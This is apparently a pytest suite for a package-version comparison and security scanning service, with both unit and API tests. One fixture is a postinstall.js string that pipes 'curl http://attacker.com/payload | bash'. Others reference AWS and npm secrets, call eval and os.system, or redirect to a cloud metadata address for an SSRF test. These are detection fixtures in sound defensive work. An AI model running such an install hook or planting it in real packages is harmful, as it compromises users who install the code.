import io
import tarfile
import zipfile
import pytest
import pytest_asyncio
import httpx
from httpx import AsyncClient, ASGITransport
from unittest.mock import patch, AsyncMock

from app.main import app
from app.models.base import init_db
from app.api.routes.comparisons import fetch_archive_safely, VALID_ARCHIVE_SIGNATURES
from app.services.integrity.verifier import SafeArchiveInspector
from app.services.version_diff.comparator import VersionComparator
from fastapi import HTTPException


def create_mock_tarball(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files.items():
            b = content.encode("utf-8")
            ti = tarfile.TarInfo(name=name)
            ti.size = len(b)
            tf.addfile(ti, io.BytesIO(b))
    return buf.getvalue()


def create_mock_zip(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w") as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


# -------------------------------------------------------------
# Stage 2, Task 1 Comprehensive Unit Tests for Comparator
# -------------------------------------------------------------

def test_newly_added_file_containing_suspicious_code():
    """1. Newly added file containing suspicious code must be detected."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "index.js": "console.log('main module');"
    }
    target_files = {
        "index.js": "console.log('main module');",
        "postinstall.js": "const cp = require('child_process'); cp.execSync('curl -s http://attacker.com/payload | bash');"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    summary = result["summary"]

    assert "postinstall.js" in diff["added_files"]
    assert len(diff["added_file_analyses"]) == 1
    added_analysis = diff["added_file_analyses"][0]
    assert added_analysis["file_path"] == "postinstall.js"
    assert len(added_analysis["findings"]) > 0

    rule_ids = [f["rule_id"] for f in added_analysis["findings"]]
    # SHL-001 or DLX-001 should trigger
    assert any(rid in ["SHL-001", "DLX-001"] for rid in rule_ids)
    assert summary["security_analysis"]["total_new_findings"] > 0
    assert summary["security_analysis"]["added_files_analyzed_count"] == 1


def test_newly_added_clean_file():
    """2. Newly added clean file must have 0 findings."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "index.js": "module.exports = { greet: () => 'hello' };"
    }
    target_files = {
        "index.js": "module.exports = { greet: () => 'hello' };",
        "utils.js": "function add(a, b) { return a + b; }\nmodule.exports = { add };"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    summary = result["summary"]

    assert "utils.js" in diff["added_files"]
    added_analysis = diff["added_file_analyses"][0]
    assert added_analysis["file_path"] == "utils.js"
    assert len(added_analysis["findings"]) == 0
    assert summary["security_analysis"]["total_new_findings"] == 0


def test_modified_file_introducing_suspicious_operation():
    """3. Modified file introducing a suspicious operation must report new finding."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "client.js": "function connect(host) {\n  return host;\n}\nmodule.exports = connect;\n"
    }
    target_files = {
        "client.js": "function connect(host) {\n  const key = 'AWS_SECRET_ACCESS_KEY';\n  return host;\n}\nmodule.exports = connect;\n"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    summary = result["summary"]

    assert "client.js" in diff["modified_files"]
    file_diff = [fd for fd in diff["file_diffs"] if fd["file_path"] == "client.js"][0]

    assert len(file_diff["new_findings"]) >= 1
    new_f = file_diff["new_findings"][0]
    assert new_f["rule_id"] == "CRD-001"
    assert new_f["severity"] == "CRITICAL"
    assert new_f["line_number"] == 2
    assert "AWS_SECRET_ACCESS_KEY" in new_f["evidence_excerpt"]
    assert len(file_diff["preexisting_findings"]) == 0
    assert summary["security_analysis"]["total_new_findings"] >= 1


def test_modified_file_with_preexisting_suspicious_operation():
    """4. Modified file with existing suspicious operation that was NOT newly introduced."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    # Base file already had an eval call
    base_files = {
        "parser.js": "function parse(str) {\n  return eval(str);\n}\nfunction helper() { return 1; }\n"
    }
    # Target file modifies helper function, keeping eval intact
    target_files = {
        "parser.js": "function parse(str) {\n  return eval(str);\n}\nfunction helper() { return 2; }\n"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    summary = result["summary"]

    assert "parser.js" in diff["modified_files"]
    file_diff = [fd for fd in diff["file_diffs"] if fd["file_path"] == "parser.js"][0]

    # Pre-existing finding should be identified and separated from new findings
    assert len(file_diff["preexisting_findings"]) >= 1
    assert any(f["rule_id"] == "DYN-001" for f in file_diff["preexisting_findings"])
    assert len(file_diff["new_findings"]) == 0
    assert summary["security_analysis"]["total_new_findings"] == 0


def test_removed_file_handling():
    """5. Removed file must not cause errors and be tracked cleanly in removed_files."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "old_feature.js": "const secret = process.env.NPM_TOKEN;",
        "index.js": "console.log('main');"
    }
    target_files = {
        "index.js": "console.log('main');"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    summary = result["summary"]

    assert "old_feature.js" in diff["removed_files"]
    assert summary["files_removed_count"] == 1
    assert summary["security_analysis"]["total_new_findings"] == 0


def test_multiple_suspicious_indicators_in_one_file():
    """6. Multiple suspicious indicators in one file must all be preserved with proper metadata."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "worker.js": "console.log('worker init');"
    }
    target_files = {
        "worker.js": (
            "// Multi-stage indicator\n"
            "const token = process.env.AWS_SECRET_ACCESS_KEY;\n"
            "eval('console.log(token)');\n"
            "child_process.execSync('whoami');\n"
        )
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    file_diff = [fd for fd in diff["file_diffs"] if fd["file_path"] == "worker.js"][0]

    rule_ids = [f["rule_id"] for f in file_diff["new_findings"]]
    assert "CRD-001" in rule_ids
    assert "DYN-001" in rule_ids
    assert "SHL-001" in rule_ids
    assert len(file_diff["new_findings"]) >= 3


def test_line_number_and_evidence_preservation():
    """7. Line-number, evidence excerpts, severity, confidence, and rule IDs must be preserved."""
    comparator = VersionComparator()
    base_meta = {"version": "1.0.0"}
    target_meta = {"version": "1.1.0"}

    base_files = {
        "test.py": "def run():\n    pass\n"
    }
    target_files = {
        "test.py": "def run():\n    # line 2\n    # line 3\n    os.system('id')\n"
    }

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    diff = result["diff_details"]
    file_diff = [fd for fd in diff["file_diffs"] if fd["file_path"] == "test.py"][0]

    assert len(file_diff["new_findings"]) >= 1
    finding = file_diff["new_findings"][0]

    assert finding["file_path"] == "test.py"
    assert finding["line_number"] == 4
    assert "os.system" in finding["evidence_excerpt"]
    assert finding["severity"] in ["HIGH", "CRITICAL"]
    assert finding["confidence"] in ["LOW", "MEDIUM", "HIGH"]
    assert "rule_id" in finding
    assert "recommended_action" in finding


def test_existing_comparison_functionality_remains_intact():
    """8. Existing comparison functionality (dependencies, scripts, counts, diffs) remains intact."""
    comparator = VersionComparator()
    base_meta = {
        "version": "1.0.0",
        "dependencies": {"express": "4.17.1"},
        "lifecycle_scripts": {}
    }
    target_meta = {
        "version": "1.1.0",
        "dependencies": {"express": "4.18.2", "axios": "1.6.0"},
        "lifecycle_scripts": {"postinstall": "node setup.js"}
    }
    base_files = {"a.js": "var x = 1;"}
    target_files = {"a.js": "var x = 2;", "b.js": "var y = 3;"}

    result = comparator.compare_versions(base_meta, target_meta, base_files, target_files)
    summary = result["summary"]
    diff = result["diff_details"]

    assert summary["files_added_count"] == 1
    assert summary["files_modified_count"] == 1
    assert summary["files_removed_count"] == 0
    assert summary["deps_added_count"] == 1
    assert summary["install_scripts_changed"] is True
    assert len(diff["file_diffs"]) == 1
    assert len(diff["file_diffs"][0]["diff_lines"]) > 0


# -------------------------------------------------------------
# Integration API Tests for Comparisons
# -------------------------------------------------------------

@pytest.mark.asyncio
async def test_comparison_successful_diff():
    await init_db()
    transport = ASGITransport(app=app)

    base_tar = create_mock_tarball({
        "package/index.js": "function test() { return 1; }",
        "package/package.json": '{"name": "test-pkg", "version": "1.0.0"}'
    })

    target_tar = create_mock_tarball({
        "package/index.js": "function test() { return 2; }",
        "package/new_file.js": "console.log('hello');",
        "package/package.json": '{"name": "test-pkg", "version": "1.1.0"}'
    })

    mock_metadata = {
        "name": "test-pkg",
        "versions": {
            "1.0.0": {
                "name": "test-pkg",
                "version": "1.0.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz"}
            },
            "1.1.0": {
                "name": "test-pkg",
                "version": "1.1.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.1.0.tgz"}
            }
        }
    }

    async def mock_get(url, *args, **kwargs):
        req = httpx.Request("GET", str(url))
        url_str = str(url)
        if "1.0.0.tgz" in url_str:
            return httpx.Response(200, content=base_tar, request=req)
        elif "1.1.0.tgz" in url_str:
            return httpx.Response(200, content=target_tar, request=req)
        elif "test-pkg" in url_str:
            return httpx.Response(200, json=mock_metadata, request=req)
        return httpx.Response(404, request=req)

    with patch("httpx.AsyncClient.get", side_effect=mock_get):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v1/comparisons", json={
                "ecosystem": "npm",
                "package_name": "test-pkg",
                "base_version": "1.0.0",
                "target_version": "1.1.0"
            })
            assert resp.status_code == 200, resp.text
            data = resp.json()
            assert data["files_added_count"] == 1
            assert data["files_modified_count"] == 2
            assert data["files_removed_count"] == 0
            assert "archive_inspection" in data["summary_json"]
            assert "security_analysis" in data["summary_json"]
            archive_insp = data["summary_json"]["archive_inspection"]
            assert archive_insp["status"] == "complete"
            assert archive_insp["base"]["archive_size_bytes"] == len(base_tar)
            assert archive_insp["base"]["extracted_file_count"] == 2
            assert archive_insp["target"]["archive_size_bytes"] == len(target_tar)
            assert archive_insp["target"]["extracted_file_count"] == 3


@pytest.mark.asyncio
async def test_comparison_download_failure_returns_error():
    await init_db()
    transport = ASGITransport(app=app)

    mock_metadata = {
        "name": "test-pkg",
        "versions": {
            "1.0.0": {
                "name": "test-pkg",
                "version": "1.0.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz"}
            },
            "1.1.0": {
                "name": "test-pkg",
                "version": "1.1.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.1.0.tgz"}
            }
        }
    }

    async def mock_get(url, *args, **kwargs):
        req = httpx.Request("GET", str(url))
        url_str = str(url)
        if "1.0.0.tgz" in url_str:
            return httpx.Response(404, text="Not Found", request=req)
        elif "test-pkg" in url_str:
            return httpx.Response(200, json=mock_metadata, request=req)
        return httpx.Response(404, request=req)

    with patch("httpx.AsyncClient.get", side_effect=mock_get):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v1/comparisons", json={
                "ecosystem": "npm",
                "package_name": "test-pkg",
                "base_version": "1.0.0",
                "target_version": "1.1.0"
            })
            assert resp.status_code == 502
            assert "HTTP 404" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_comparison_empty_archive_returns_error():
    await init_db()
    transport = ASGITransport(app=app)

    mock_metadata = {
        "name": "test-pkg",
        "versions": {
            "1.0.0": {
                "name": "test-pkg",
                "version": "1.0.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz"}
            },
            "1.1.0": {
                "name": "test-pkg",
                "version": "1.1.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.1.0.tgz"}
            }
        }
    }

    async def mock_get(url, *args, **kwargs):
        req = httpx.Request("GET", str(url))
        url_str = str(url)
        if "1.0.0.tgz" in url_str:
            return httpx.Response(200, content=b"", request=req)
        elif "test-pkg" in url_str:
            return httpx.Response(200, json=mock_metadata, request=req)
        return httpx.Response(404, request=req)

    with patch("httpx.AsyncClient.get", side_effect=mock_get):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v1/comparisons", json={
                "ecosystem": "npm",
                "package_name": "test-pkg",
                "base_version": "1.0.0",
                "target_version": "1.1.0"
            })
            assert resp.status_code == 400
            assert "empty (0 bytes received)" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_comparison_extraction_failure_returns_error():
    await init_db()
    transport = ASGITransport(app=app)

    corrupt_tar = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03corrupteddata12345"

    mock_metadata = {
        "name": "test-pkg",
        "versions": {
            "1.0.0": {
                "name": "test-pkg",
                "version": "1.0.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.0.0.tgz"}
            },
            "1.1.0": {
                "name": "test-pkg",
                "version": "1.1.0",
                "dist": {"tarball": "https://registry.npmjs.org/test-pkg/-/test-pkg-1.1.0.tgz"}
            }
        }
    }

    async def mock_get(url, *args, **kwargs):
        req = httpx.Request("GET", str(url))
        url_str = str(url)
        if "1.0.0.tgz" in url_str:
            return httpx.Response(200, content=corrupt_tar, request=req)
        elif "test-pkg" in url_str:
            return httpx.Response(200, json=mock_metadata, request=req)
        return httpx.Response(404, request=req)

    with patch("httpx.AsyncClient.get", side_effect=mock_get):
        async with AsyncClient(transport=transport, base_url="http://test") as client:
            resp = await client.post("/api/v1/comparisons", json={
                "ecosystem": "npm",
                "package_name": "test-pkg",
                "base_version": "1.0.0",
                "target_version": "1.1.0"
            })
            assert resp.status_code == 400
            assert "Corrupted or invalid Tar archive" in resp.json()["detail"]


@pytest.mark.asyncio
async def test_ssrf_and_redirect_validation():
    transport = httpx.MockTransport(
        lambda request: httpx.Response(
            302,
            headers={"Location": "http://169.254.169.254/latest/meta-data"},
            request=request
        )
    )
    async with httpx.AsyncClient(transport=transport) as client:
        with pytest.raises(HTTPException) as exc_info:
            await fetch_archive_safely(
                client=client,
                initial_url="https://registry.npmjs.org/test/-/test-1.0.0.tgz",
                version_label="1.0.0",
                package_name="test"
            )
        assert exc_info.value.status_code in [400, 403]
